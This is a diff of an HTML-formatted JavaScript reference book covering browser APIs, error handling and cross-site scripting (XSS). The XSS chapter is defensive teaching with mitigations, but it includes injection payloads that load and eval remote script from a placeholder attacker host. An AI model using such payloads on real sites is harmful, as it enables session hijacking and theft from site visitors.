 document.getElementById(&apos;upload&apos;).addEventListener(apos;change&apos;, showImage);
 <b>function</b> showImage(evt) {
@@ -23783,10 +24038,12 @@ document.getElementById(&apos;upload&apos;).addEventListener(apos;change&apos;, 
 <p>The blob.slice() method is used to create a new Blob object containing the data
 in the specified range of bytes of the source Blob. This method is
 usable with File instances too, since File extends Blob.</p>
+
 <p>Here we slice a file in a specific amount of blobs. This is useful
 especially in cases where you need to process files that are too large
 to read in memory all in once. We can then read the chunks one by one
 using FileReader.</p>
+
 <pre>
 <i>/&ast;&ast;</i>
 <i>&ast;&ast; @param {File&vert;Blob} - file to slice</i>
@@ -23812,10 +24069,13 @@ using FileReader.</p>
 <p>If you want to get the properties of the file (like the name or the
 size) you can do it before using the File Reader. If we have the
 following html piece of code:</p>
+
 <pre>
 <b>&lt;</b><b>input</b>type=&quot;file&quot; id=&quot;newFile&quot;<b>&gt;</b>
 </pre>
+
 <p>You can access the properties directly like this:</p>
+
 <pre>
 document.getElementById(&apos;newFile&apos;).addEventListener(&apos;change&apos;, getFile);
 <b>function</b> getFile(event) {
@@ -23825,6 +24085,7 @@ document.getElementById(&apos;newFile&apos;).addEventListener(&apos;change&apos;
     console.log(&apos;Size of the file&apos;, file.size);
 }
 </pre>
+
 <p>You can also get easily the following attributes: lastModified
 (Timestamp), lastModifiedDate (Date), and type (File Type)</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -23832,22 +24093,28 @@ document.getElementById(&apos;newFile&apos;).addEventListener(&apos;change&apos;
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>The HTML5 file API allows you to restrict which kind of files are
 accepted by simply setting the accept attribute on a file input, e.g.:</p>
+
 <pre>
 <b>&lt;</b> <b>input</b>type=&quot;file&quot; accept=&quot;image/jpeg&quot;<b>&gt;</b>
 </pre>
+
 <p>Specifying multiple MIME types separated by a comma (e.g. ) or using
 wildcards (e.g. image<i>/&ast;</i> for allowing all types of images) give 
 you a quick and powerful way to restrict the type of files you want to select. 
 Here&apos;s an example for allowing any image or video:</p>
+
 <pre>
 <b>&lt;</b><b>input</b> type=&quot;file&quot; accept=&quot;image/&ast;,video&ast;&quot;<b>&gt;</b>
 </pre>
+
 <p>By default, the file input lets the user select a single file. If you
 want to enable multiple file selection, simply add the multiple
 attribute:</p>
+
 <pre>
 <b>&lt;</b><b>input</b> type=&quot;file&quot;multiple<b>&gt;</b>
 </pre>
+
 <p>You can then read all the selected files via the file input&apos;s files
 array. See read file as dataUrl</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -23873,6 +24140,7 @@ array. See read file as dataUrl</p>
 <b>var</b> string = &quot;a1,a2,a3&quot;;
 downloadCSV(string);
 </pre>
+
 <p>Source reference; <a href="https://github.com/mholt/PapaParse/issues/175">
 &lt;https://github.com/mholt/PapaParse/issues/175&gt;</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -23883,6 +24151,7 @@ downloadCSV(string);
 <p>We use to ask the user if he/she wants to receive notifications from
 our website.</p>
 &nbsp;
+
 <pre>
 Notification.requestPermission(<b>function</b>() {
   <b>if</b> (Notification.permission === &apos;granted&apos;) {
@@ -23896,8 +24165,10 @@ Notification.requestPermission(<b>function</b>() {
   }
 });
 </pre>
+
 <p>Since Firefox 47 The method can also return a promise when handling
 the user&apos;s decision for granting permission</p>
+
 <pre>
 Notification.requestPermission().then(<b>function</b>(permission) {
   <b>if</b> (!(&apos;permission&apos; <b>in</b> Notification)) {
@@ -23915,10 +24186,13 @@ Notification.requestPermission().then(<b>function</b>(permission) {
 <p>After the user has approved a request for permission to send
 notifications, we can send a simple notification that says Hello to
 the user:</p>
+
 <pre>
 <b>new</b> Notification(&apos;Hello&apos;, { body: &apos;Hello, world!&apos;, icon: &apos;url to an .ico image&apos; });
 </pre>
+
 <p>This will send a notification like this:</p>
+
 <blockquote>
 <b>Hello</b><br/>
 
@@ -23928,39 +24202,50 @@ Hello, world!
 <h3 id="ch90-3">Section 90.3: Closing a notification</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>You can close a notification by using the .close() method.</p>
+
 <pre>
 <b>let</b> notification = <b>new</b> Notification(title, options);
 // <i>do some work, then close the notification</i>
 notification.close()
 </pre>
+
 <p>You can utilize the setTimeout function to auto-close the notification sometime in the future.</p>
 <!-- page 412 -->
+
 <pre>
 <b>let</b> notification = <b>new</b> Notification(title, options);
 setTimeout(() =&gt; {
   notification.close()
 }, 4000);
 </pre>
+
 <p>The above code will spawn a notification and close it after 4 seconds.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch90-4">Section 90.4: Notification events</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>The Notification API specifications support 2 events that can be fired by a Notification.</p>
+
 <ol type="1" start="1">
   <li>The click event.</li>
 </ol>
+
 <p>This event will run when you click on the notification body (excluding
 the closing X and the Notifications configuration button).</p>
+
 <p>Example:</p>
+
 <pre>
 notification.onclick = <b>function</b>(event) {
   console.debug(&quot;you click me and this is my event object: &quot;, event);
 }
 </pre>
+
 <ol type="1" start="2">
   <li>The error event</li>
 </ol>
+
 <p>The notification will fire this event whenever something wrong will happen, like being unable to display</p>
+
 <pre>
 notification.onerror = <b>function</b>(event) {
   console.debug(&quot;There was an error: &quot;, event);
@@ -23977,10 +24262,13 @@ and does nothing if the device doesn&apos;t support it.</p>
 <h3 id="ch91-1">Section 91.1: Single vibration</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Vibrate the device for 100ms:</p>
+
 <pre>
 window.navigator.vibrate(100);
 </pre>
+
 <p>or</p>
+
 <pre>
 window.navigator.vibrate(&lbrack;100&rbrack;);
 </pre>
@@ -23988,6 +24276,7 @@ window.navigator.vibrate(&lbrack;100&rbrack;);
 <h3 id="ch91-2">Section 91.2: Check for support</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Check if browser supports vibrations</p>
+
 <pre>
 <b>if</b> (&apos;vibrate&apos; <b>in</b> window.navigator)
     // <i>browser has support for vibrations</i>
@@ -23999,9 +24288,11 @@ window.navigator.vibrate(&lbrack;100&rbrack;);
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>An array of values describes periods of time in which the device is
 vibrating and not vibrating.</p>
+
 <pre>
 window.navigator.vibrate(&lbrack;200, 100, 200&rbrack;);
 </pre>
+
 <!-- page 414 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch92">Chapter 92: Battery Status API</h2>
@@ -24066,6 +24357,7 @@ navigator.getBattery().then(<b>function</b>(battery) {
   console.log( &quot;Battery will get fully charged in &quot;, battery.chargingTime, &quot; seconds&quot;);
 });
 </pre>
+
 <!-- page 415 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch93">Chapter 93: Fluent API</h2>
@@ -24148,6 +24440,7 @@ crypto.subtle.digest(&apos;SHA-256&apos;, input)
 console.error(err);
 });
 </pre>
+
 <p>The current draft suggests to provide at least SHA-1, SHA-256, SHA-384 and SHA-512 
 but this is no strict requirement and subject to change. However, the SHA family can still
 be considered a good choice as it will likely be supported in all major browsers.</p>
@@ -24184,11 +24477,14 @@ ends inclusive):</p>
 how to convert private key from this key pair to base64 so you can use
 it with OpenSSL etc. Please note that this process can also be used
 for public key you just have to use prefix and suffix below:</p>
+
 <pre>
 &minus;&minus;&minus;BEGIN PUBLIC KEY&minus;&minus;&minus;
 &minus;&minus;&minus;END PUBLIC KEY&minus;&minus;&minus;
 </pre>
+
 <p>NOTE: This example is fully tested in these browsers: Chrome, Firefox, Opera, Vivaldi</p>
+
 <pre>
 <b>function</b> arrayBufferToBase64(arrayBuffer) {
   <b>var</b> byteArray = <b>new</b> Uint8Array(arrayBuffer);
@@ -24244,7 +24540,9 @@ window.crypto.subtle.generateKey)
   });
 });
 </pre>
+
 <!-- ![](./images/image044.png){width="7.486805555555556in" height="8.324305555555556in"} -->
+
 <p>That&apos;s it! Now you have a fully working and compatible RSA-OAEP
 Private Key in PEM format which you can use wherever you want. Enjoy!</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -24253,13 +24551,17 @@ Private Key in PEM format which you can use wherever you want. Enjoy!</p>
 <p>So, have you ever wondered how to use your PEM RSA key pair that was
 generated by OpenSSL in Web Cryptography API? If the answers is yes.
 Great! You are going to find out.</p>
+
 <p>NOTE: This process can also be used for public key, you only need to
 change prefix and suffix to:</p>
+
 <pre>
 &minus;&minus;&minus;BEGIN PUBLIC KEY&minus;&minus;&minus;
 &minus;&minus;&minus;END PUBLIC KEY&minus;&minus;&minus;
 </pre>
+
 <p>This example assumes that you have your RSA key pair generated in PEM.</p>
+
 <pre>
 </pre>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -24286,32 +24588,44 @@ these security issues.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Let&apos;s say Joe owns a website that allows you to log on, view puppy
 videos, and save them to your account.</p>
+
 <p>Whenever a user searches on that website, they are redirected to 
 <i>https://example.com/search?q=brown+puppies.</i></p>
+
 <p>If a user&apos;s search doesn&apos;t match anything, than they see a message
 along the lines of:</p>
+
 <blockquote>
 Your search (<b>brown puppies</b>), didn&apos;t match anything. Try again.
 </blockquote>
+
 <p>On the backend, that message is displayed like this:</p>
+
 <pre>
 <b>if</b>(!searchResults) {
   webPage += &quot;&lt;div&gt;Your search (&lt;b&gt;&quot; &plus; searchQuery &plus; &quot;&lt;/b&gt;), didn&apos;t match anything. Try again.&quot;;
 }
 </pre>
+
 <p>However, when Alice searches for <b>&lt;h1&gt;</b>heading<b>&lt;/h1&gt;</b>, she gets this back:</p>
+
 <blockquote>
 Your search (<b>headings</b>
 ) didn&apos;t match anything. Try again.
 </blockquote>
+
 <p>Raw HTML:</p>
+
 <pre>
 Your search (&lt;b&gt;&lt;h1&gt;headings&lt;/h1&gt;&lt;/b&gt;) didn&apos;t match anything. Try again.
 </pre>
+
 <p>Than Alice searches for <b>&lt;script&gt;</b>alert(1)<b>&lt;/script&gt;</b>, she sees:</p>
+
 <blockquote>
 Your search (), didn&apos;t match anything. Try again.
 </blockquote>
+
 <p>And:</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 46.  (419) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -24323,13 +24637,17 @@ Your search (), didn&apos;t match anything. Try again.
 <!-- ![](./images/image046.png){width="4.585416666666666in" height="1.4868055555555555in"} -->
 <p>Than Alice searches for <b>&lt;script</b> src = &quot;https://alice.evil/puppy_xss.js&gt;&lt;/script&gt;really cute puppies
 , and copies the link in her address bar, and then emails Bob:</p>
+
 <blockquote>
 Bob,<br/>
 When I search for <a href="https://example.com/search?q=%3Cscript+src+=+%22https://alice.evil/puppy_xss.js%3E%3C/script%3Ereally+cute+puppies">
 cute puppies</a>, nothing happens!
 </blockquote>
+
 <p>Than Alice successfully gets Bob to run her script while Bob is logged on to his account.</p>
+
 <h4>Mitigation:</h4>
+
 <ol type="1" start="1">
   <li>Escape all angle brackets in searches before returning the search
     term when no results are found.</li>
@@ -24342,10 +24660,13 @@ cute puppies</a>, nothing happens!
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Let&apos;s say that Bob owns a social website that allows users to
 personalize their profiles.</p>
+
 <p>Alice goes to Bob&apos;s website, creates an account, and goes to her
 profile settings. She sets her profile description to I&apos;m actually
 too lazy to write something here.</p>
+
 <p>When her friends view her profile, this code gets run on the server:</p>
+
 <pre>
 <b>if</b>(viewedPerson.profile.description) {
   page += &quot;&lt;div&gt;&quot; &plus; viewedPerson.profile.description &plus; &quot;&lt;/div&gt;&quot;;
@@ -24353,25 +24674,36 @@ too lazy to write something here.</p>
   page += &quot;&lt;div&gt;This person doesn&apos;t have a profile description.&lt;/div&gt;&quot;;
 }
 </pre>
+
 <p>Resulting in this HTML:</p>
+
 <pre>
 <b>&lt;div&gt;</b>I&apos;m actually too lazy to write something here.<b>&lt;/div&gt;</b>
 </pre>
+
 <p>Than Alice sets her profile description to <b>&gt;</b>. When she visits her
 profile, instead of seeing</p>
+
 <blockquote>
 &lt;b&gt;I like HTML&lt;/b&gt;
 </blockquote>
+
 <p>she sees</p>
+
 <blockquote>
 <b>I like HTML</b>
 </blockquote>
+
 <p>Then Alice sets her profile to</p>
+
 <pre>
 <b>&lt;script</b> src = &quot;https://alice.evil/profile_xss.js&quot;<b>&gt;&lt;/script&gt;</b>I&apos;m actually too lazy to write something here.
 </pre>
+
 <p>Whenever someone visits her profile, they get Alice&apos;s script run on Bob&apos;s website while logged on as their account.</p>
+
 <h4>Mitigation</h4>
+
 <ol type="1" start="1">
   <li>Escape angle brackets in profile descriptions, etc.</li>
   <li>Store profile descriptions in a plain text file that is then fetched
@@ -24384,6 +24716,7 @@ profile, instead of seeing</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Let&apos;s say that Bob owns a site that lets you post public messages.</p>
 <p>The messages are loaded by a script that looks like this:</p>
+
 <pre>
 addMessage(&quot;Message 1&quot;);
 addMessage(&quot;Message 2&quot;);
@@ -24392,34 +24725,46 @@ addMessage(&quot;Message 4&quot;);
 addMessage(&quot;Message 5&quot;);
 addMessage(&quot;Message 6&quot;);
 </pre>
+
 <p>The addMessage function adds a posted message to the DOM. However, in
 an effort to avoid XSS, <b>any HTML in messages posted is escaped.</b></p>
+
 <p>The script is generated <b>on the server</b> like this:</p>
+
 <pre>
 <b>for</b>(<b>var</b> i = 0; i &lt; messages.length; i++) {
   script += &quot;addMessage(<b>&bsol;&quot;</b>&quot; &plus; messages&lbrack;i&rbrack; &plus; &quot;<b>&bsol;&quot;</b>);&quot;;
 }
 </pre>
+
 <p>So alice posts a message that says: My mom said: &quot;Life is good. Pie makes it better. &quot;. 
 Than when she previews the message, instead of seeing her message she sees an error in the console:</p>
+
 <pre>
 Uncaught SyntaxError: missing ) after argument list
 </pre>
+
 <p>Why? Because the generated script looks like this:</p>
+
 <pre>
 addMessage(&quot;My mom said: &quot;Life is good. Pie makes it better. &quot;&quot;);
 </pre>
+
 <p>That&apos;s a syntax error. Than Alice posts:</p>
+
 <pre>
 I like pie &quot;);fetch(&quot;https:// <i>alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);//</i>
 </pre>
+
 <p>Then the generated script looks like:</p>
+
 <pre>
 addMessage(&quot;I like pie &quot;);fetch(&quot;https://alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);// <i>&quot;);</i>
 </pre>
 
-<p>That adds the message I like pie, but it also <b>downloads and runs
-<b>https:<i>// alice.evil/js_xss.js</i></b> whenever someone visits Bob&apos;s site.</b></p>
+<p>That adds the message I like pie, but it also <b>downloads and runs</b>
+<b>https:</b>// <i>alice.evil/js_xss.js</i> <b>whenever someone visits Bob&apos;s site.</b></p>
+
 <h4>Mitigation:</h4>
 
 <ol type="1" start="1">
@@ -24434,6 +24779,7 @@ addMessage(&quot;I like pie &quot;);fetch(&quot;https://alice.evil/js_xss.js&quo
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>If you don&apos;t think that malicious scripts can harm your site, <b>you are wrong</b>. 
 Here is a list of what a malicious script could do:</p>
+
 <!-- page 424 -->
 <ol type="1" start="1">
   <li>Remove itself from the DOM so that <b>it can&apos;t be traced</b></li>
@@ -24446,6 +24792,7 @@ Here is a list of what a malicious script could do:</p>
   <li>Put up a fake paywall demanding that users <b>pay money</b> to access
     the site <b>that actually goes to the script author</b>.</li>
 </ol>
+
 <p>Please, <b>don&apos;t think that XSS won&apos;t harm your website and its
 visitors.</b></p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -24453,26 +24800,35 @@ visitors.</b></p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Let&apos;s say that whenever someone visits a profile page in Bob&apos;s website, 
 the following URL is fetched:</p>
+
 <pre>
 https:// <i>example.com/api/users/1234/profiledata.json</i>
 </pre>
+
 <p>With a response like this:</p>
+
 <pre>
 {
   &quot;name&quot;: &quot;Bob&quot;,
   &quot;description&quot;: &quot;Likes pie & security holes.&quot;
 }
 </pre>
+
 <p>Than that data is parsed & inserted:</p>
+
 <pre>
 <b>var</b> data = eval(&quot;(&quot; + resp + &quot;)&quot;);
 document.getElementById(&quot;#name&quot;).innerText = data.name;
 document.getElementById(&quot;#description&quot;).innerText = data.description;
 </pre>
+
 <p>Seems good, right? <b>Wrong.</b></p>
+
 <p>What if someone&apos;s description is Likes XSS.&quot;});alert(1);({&quot;name&quot;:&quot;Alice&quot;,&quot;description&quot;:&quot;Likes
 XSS.?</p>
+
 <p>Seems weird, but if poorly done, the response will be:</p>
+
 <pre>
 {
   &quot;name&quot;: &quot;Alice&quot;,
@@ -24480,7 +24836,9 @@ XSS.?</p>
 XSS.&quot;
 }
 </pre>
+
 <p>And this will be evaled:</p>
+
 <pre>
 ({
   &quot;name&quot;: &quot;Alice&quot;,
@@ -24488,8 +24846,11 @@ XSS.&quot;
 XSS.&quot;
 })
 </pre>
+
 <p>If you don&apos;t think that&apos;s a problem, paste that in your console and see what happens.</p>
+
 <h4>Mitigation</h4>
+
 <ul>
   <li><b>Use JSON.parse instead of eval to get JSON.</b> In general, don&apos;t use
     eval, and definitely don&apos;t use eval with something a user could
@@ -24515,6 +24876,7 @@ Hello! &bsol;&bsol;&quot;});alert(1);({
 able to access remote content if the remote address has not the same
 <b>origin</b> of the script. This prevents malicious scripts from
 performing requests to other websites to obtain sensitive data.</p>
+
 <p>The <b>origin</b> of two addresses is considered the same if both URLs
 have the same <i>protocol</i>, <i>hostname</i> and <i>port</i>.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -24522,11 +24884,14 @@ have the same <i>protocol</i>, <i>hostname</i> and <i>port</i>.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>The window.postMessage() method together with its relative event handler window.onmessage can 
 be safely used to enable cross-origin communication.</p>
+
 <p>The postMessage() method of the target window can be called to send a message to
 another window, which will be able to intercept it with its onmessage
 event handler, elaborate it, and, if necessary, send a response back
 to the sender window using postMessage() again.</p>
+
 <h4>Example of Window communicating with a children frame</h4>
+
 <ul>
   <li>Content of http:// <i>main-site.com/index.html</i>:
 <pre>
@@ -24544,6 +24909,7 @@ to the sender window using postMessage() again.</p>
 </pre>
 </li>
   <li>Content of main_site_script.js:
+
 <pre>
 // <i>Get the &lt;iframe&gt;&apos;s window</i>
 <b>var</b> frameWindow = document.getElementById(&apos;frame-id&apos;).contentWindow;
@@ -24590,16 +24956,20 @@ inside a browser), there is no straightforward solution available for
 requesting content from sources other than the current domain. (By the
 way, this limitation does not exist in JavaScript-server tools such as
 Node JS.)</p>
+
 <p>However, it is (in some situations) indeed possible to retrieve data
 from other sources using the following methods. Please do note that
 some of them may present hacks or workarounds instead of solutions
 production system should rely on.</p>
+
 <h4>Method 1: CORS</h4>
+
 <p>Most public APIs today allow developers to send data bidirectionally between client 
 and server by enabling a feature called CORS (Cross-Origin Resource Sharing). The browser 
 will check if a certain HTTP header (Acess-Control-Allow-Origin) is set and that the 
 requesting site&apos;s domain is listed in the header&apos;s value. If it is, then 
 the browser will allow establishing AJAX connections.</p>
+
 <p>However, because developers cannot change other servers&apos; response
 headers, this method can&apos;t always be relied on.</p>
 <h4>Method 2: JSONP</h4>
@@ -24610,6 +24980,7 @@ loaded from any domain. Still, it is crucial to mention that
 requesting JavaScript code from external sources is <b>always</b> a
 potential security risk and this should generally be avoided if
 there&apos;s a better solution available.</p>
+
 <p>The data requested using JSONP is typically JSON, which happens to fit
 the syntax used for object definition in JavaScript, making this
 method of transport very simple. A common way to let websites use the
@@ -24617,6 +24988,7 @@ external data obtained via JSONP is to wrap it inside a callback
 function, which is set via a GET parameter in the URL. Once the
 external script file loads, the function will be called with the data
 as its first parameter.</p>
+
 <pre>
 <b>&lt;</b><b>script</b><b>&gt;</b>
 function myfunc(obj){
@@ -24625,11 +24997,14 @@ console.log(obj.example_field);
 <b>&lt;</b><b>/script</b><b>&gt;</b>
 <b>&lt;</b><b>script</b> src=&quot;http://example.com/api/endpoint.js?callback=myfunc&quot;<b>&gt;</b><b>&lt;</b><b>/script</b><b>&gt;</b>
 </pre>
+
 <p>The contents of http://<i>example.com/api/endpoint.js?callback=myfunc</i> might look like this:</p>
 <!-- page 428 -->
+
 <pre>
 myfunc({&quot;example_field&quot;:<b>true</b>})
 </pre>
+
 <p>The function always has to be defined first, otherwise it won&apos;t be
 defined when the external script loads.</p>
 <!-- page 429 -->
@@ -24644,10 +25019,12 @@ exceptions. It&apos;s possible to throw any type of value - for example,
 strings - but you&apos;re strongly encouraged to use Error or one of its
 derivatives to ensure that debugging information &bsol; such as stack
 traces &bsol; is correctly preserved.</p>
+
 <p>The first parameter to the Error constructor is the human-readable
 error message. You should try to always specify a useful error message
 of what went wrong, even if additional information can be found
 elsewhere.</p>
+
 <pre>
 <b>try</b> {
   <b>throw</b> <b>new</b> Error(&apos;Useful message&apos;);
@@ -24659,6 +25036,7 @@ elsewhere.</p>
 <h3 id="ch97-2">Section 97.2: Interaction with Promises</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h5>Version ≥ 6</h5>
+
 <p>Exceptions are to synchronous code what rejections are to
 promise-based asynchronous code. If an exception is thrown in a
 promise handler, its error will be automatically caught and used to
@@ -24676,10 +25054,13 @@ Promise.resolve(5)
   });
 Promise rejected: Error: I don&apos;t like five
 </pre>
+
 <h5>Version &gt;7</h5>
+
 <p>The <a href="http://tc39.github.io/ecmascript-asyncawait/">async functions proposal</a> expected to
 be part of ECMAScript 2017 extends this in the opposite direction.
 If you await a rejected promise, its error is raised as an exception:</p>
+
 <pre>
 async <b>function</b> main() {
   <b>try</b> {
@@ -24712,8 +25093,10 @@ Caught error: Invalid something
   <li><b>URIError</b> - creates an instance representing an error that occurs
     when encodeURI() or decodeURI() are passed invalid parameters.</li>
 </ul>
+
 <p>If you are implementing error handling mechanism you can check which
 kind of error you are catching from code.</p>
+
 <pre>
 <b>try</b> {
   <b>throw</b> <b>new</b> TypeError();
@@ -24727,9 +25110,11 @@ kind of error you are catching from code.</p>
   }
 }
 </pre>
+
 <p>In such case e will be an instance of TypeError. All error types
 extend the base constructor Error, therefore it&apos;s also an instance of
 Error.</p>
+
 <p>Keeping that in mind shows us that checking e to be an instance of
 Error is useless in most cases.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -24737,17 +25122,22 @@ Error is useless in most cases.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Without a try catch block, undefined functions will throw errors and
 stop execution:</p>
+
 <pre>
 undefinedFunction(&quot;This will not get executed&quot;);
 console.log(&quot;I will never run because of the uncaught error!&quot;); 
 </pre>
+
 <p>Will throw an error and not run the second line:</p>
+
 <pre>
 // <i>Uncaught ReferenceError: undefinedFunction is not defined</i>
 </pre>
+
 <p>You need a try catch block, similar to other languages, to ensure you
 catch that error so code can continue to execute:</p>
 <!-- page 431 -->
+
 <pre>
 <b>try</b> {
   undefinedFunction(&quot;This will not get executed&quot;);
@@ -24758,14 +25148,18 @@ catch that error so code can continue to execute:</p>
 }
 console.log(&quot;I will run because we caught the error!&quot;);
 </pre>
+
 <p>Now, we&apos;ve caught the error and can be sure that our code is going to
 execute</p>
+
 <pre>
 // <i>An error occurred! ReferenceError: undefinedFunction is not defined(&bsol;)</i>
 // <i>The code-block has finished</i>
 // <i>I will run because we caught the error!</i>
 </pre>
+
 <p>What if an error occurs in our catch block!?</p>
+
 <pre>
 <b>try</b> {
   undefinedFunction(&quot;This will not get executed&quot;);
@@ -24777,14 +25171,18 @@ execute</p>
 }
 console.log(&quot;I won&apos;t run because of the uncaught error in the catch block!&quot;);
 </pre>
+
 <p>We won&apos;t process the rest of our catch block, and execution will halt
 except for the finally block.</p>
+
 <pre>
 // <i>The code-block has finished</i>
 // <i>Uncaught ReferenceError: otherUndefinedFunction is not defined(...)</i>
 </pre>
+
 <p>You could always nest your try catch blocks.. but you shouldn&apos;t
 because that will get extremely messy..</p>
+
 <pre>
 <b>try</b> {
   undefinedFunction(&quot;This will not get executed&quot;);
@@ -24800,7 +25198,9 @@ because that will get extremely messy..</p>
 }
 console.log(&quot;I will run because we caught the error!&quot;);
 </pre>
+
 <p>Will catch all errors from the previous example and log the following:</p>
+
 <pre>
 // <i>Too much nesting is bad for my heart and soul&hellip;</i>
 // <i>An error occurred! ReferenceError: undefinedFunction is not defined(...)</i>
@@ -24810,6 +25210,7 @@ console.log(&quot;I will run because we caught the error!&quot;);
 <p>So, how can we catch all errors!? For undefined variables and
 functions: you can&apos;t.</p>
 <!-- page 432 -->
+
 <p>Also, you shouldn&apos;t wrap every variable and function in a try/catch
 block, because these are simple examples that will only ever occur
 once until you fix them. However, for objects, functions and other
@@ -24818,8 +25219,10 @@ properties or sub-processes or side-effects will exist, or you expect
 some error states in some circumstances, you should abstract your
 error handling in some sort of manner. Here is a very basic example
 and implementation.</p>
+
 <p>Without a protected way to call untrusted or exception throwing
 methods:</p>
+
 <pre>
 <b>function</b> foo(a, b, c) {
   console.log(a, b, c);
@@ -24840,7 +25243,9 @@ methods:</p>
 // <i>We had to nest because there&apos;s currently no other way&hellip;</i>
 // <i>Error: custom error!(...)</i>
 </pre>
+
 <p>And with protection:</p>
+
 <pre>
 <b>function</b> foo(a, b, c) {
   console.log(a, b, c);
@@ -24860,6 +25265,7 @@ protectedFunction(foo, 4, 5, 6);
 // <i>4 5 6</i>
 // <i>caught error: Error -&bsol;custom error!</i>
 </pre>
+
 <p>We catch errors and still process all the expected code, though with a
 somewhat different syntax. Either way will work, but as you build more
 advanced applications you will want to start thinking about ways to
@@ -24904,6 +25310,7 @@ abstract your error handling.</p>
 <p>The following example listens to window.onerror event and uses an image beacon
 technique to send the information through the GET parameters of an
 URL.</p>
+
 <pre>
 <b>var</b> hasLoggedOnce = <b>false</b>;
 // <i>Some browsers (at least Firefox) don&apos;t report line and column numbers</i>
